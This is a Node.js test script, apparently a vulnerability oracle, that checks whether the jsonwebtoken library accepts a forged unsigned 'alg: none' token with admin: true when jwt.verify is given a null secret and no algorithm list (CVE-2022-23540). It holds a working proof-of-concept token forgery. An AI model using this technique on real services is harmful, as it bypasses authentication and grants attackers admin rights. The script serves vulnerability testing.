'use strict';
const jwt = require('jsonwebtoken');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

try {
  // Benign operation: sign and verify a normal HMAC token with a real secret.
  const secret = 'my-benign-secret-' + Date.now();
  const token = jwt.sign({ foo: 'bar', scope: 'user' }, secret, { algorithm: 'HS256' });

  const decoded = jwt.verify(token, secret, { algorithms: ['HS256'] });

  if (!decoded || decoded.foo !== 'bar') {
    throw new Error('benign verification did not return expected payload');
  }

  // Also sanity-check that tampering normally fails with a proper secret.
  try {
    jwt.verify(token, 'wrong-secret', { algorithms: ['HS256'] });
    throw new Error('benign negative check failed: wrong secret unexpectedly verified');
  } catch (e) {
    if (e && e.message === 'benign negative check failed: wrong secret unexpectedly verified') {
      throw e;
    }
    // expected: verification with wrong secret should throw (invalid signature)
  }

  operation_completed = true;

  // Malicious input: construct an unsigned token (alg: none, empty signature)
  // and attempt to verify it while passing a falsy secret and no algorithms
  // restriction, mirroring the documented exploit scenario for CVE-2022-23540.
  function base64url(input) {
    return Buffer.from(JSON.stringify(input))
      .toString('base64')
      .replace(/=/g, '')
      .replace(/\+/g, '-')
      .replace(/\//g, '_');
  }

  const maliciousHeader = { alg: 'none', typ: 'JWT' };
  const maliciousPayload = { foo: 'bar', admin: true, marker: 'oracle-marker-' + process.pid };

  const unsignedToken = base64url(maliciousHeader) + '.' + base64url(maliciousPayload) + '.';

  let maliciousDecoded = null;
  let maliciousThrew = false;

  try {
    // No `algorithms` option specified, and secret is falsy (null).
    maliciousDecoded = jwt.verify(unsignedToken, null);
  } catch (e) {
    maliciousThrew = true;
  }

  if (!maliciousThrew && maliciousDecoded && maliciousDecoded.admin === true) {
    exploit_succeeded = true;
    evidence = 'jwt.verify() accepted an unsigned (alg=none) token with a falsy secret and no algorithms restriction, returning payload: ' + JSON.stringify(maliciousDecoded);
  } else if (maliciousThrew) {
    exploit_succeeded = false;
    evidence = 'jwt.verify() rejected the unsigned (alg=none) token when passed a falsy secret, as expected on patched versions.';
  } else {
    exploit_succeeded = false;
    evidence = 'jwt.verify() did not throw but also did not return the expected malicious payload: ' + JSON.stringify(maliciousDecoded);
  }
} catch (err) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'Unexpected exception during setup or benign operation: ' + (err && err.message ? err.message : String(err));
}

console.log('ORACLE_RESULT ' + JSON.stringify({
  operation_completed,
  exploit_succeeded,
  evidence
}));
